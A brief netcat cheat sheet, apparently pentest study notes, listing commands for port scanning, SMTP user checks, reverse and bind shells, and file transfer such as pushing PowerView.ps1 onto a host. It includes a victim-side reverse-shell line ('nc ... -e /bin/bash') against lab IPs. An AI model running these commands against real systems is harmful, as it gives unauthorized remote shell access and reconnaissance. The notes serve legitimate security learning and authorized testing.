> Netcat is a simple Unix utility which reads and writes data across network connections using TCP or UDP protocol.
> Netcat is **not** a port scanner, but it can be used as such in a rudimentary way to showcase how a typical port scanner works.

# Binary Location

Copy to directory
```
cp /usr/share/windows-resources/binaries/nc.exe .
```

# Port Scanning

#Port_Scanning

Perform a TCP port scan
```bash
nc -nvv -w 1 -z 192.168.69.123 3388-3390
```

Bash loop with `nc` to sweep for port 445
```bash
for i in $(seq 1 254); do nc -zv -w 1 192.168.69.$i 445; done
```

Perform a UDP port scan
```bash
nc -nv -u -z -w 1 192.168.69.123 120-123
```

#SMTP_Enumeration

Validate SMTP users
```bash
nc -nv 192.168.69.123 25
```

# Shell Access

#Shell_Access #Remote_Access

Listener to catch reverse shell on port 4444
```bash
nc -nvlp 4444
```

Victim to connect to our reverse shell listener
```bash
nc 192.168.69.123 4444 -e /bin/bash
```

Bind shell
```bash
nc 192.168.69.123 4444
```

# File Transfer

#File_Sharing 

Receive file
```bash
nc -l -p 1234 > system.txt 
```
```cmd
.\nc.exe -l -p 9999 > PowerView.ps1
```

Send file
```bash
nc 192.168.69.123 1234 < system.file
```
```cmd
.\nc.exe -w 3 10.10.69.123 9999 < PowerView.ps1
```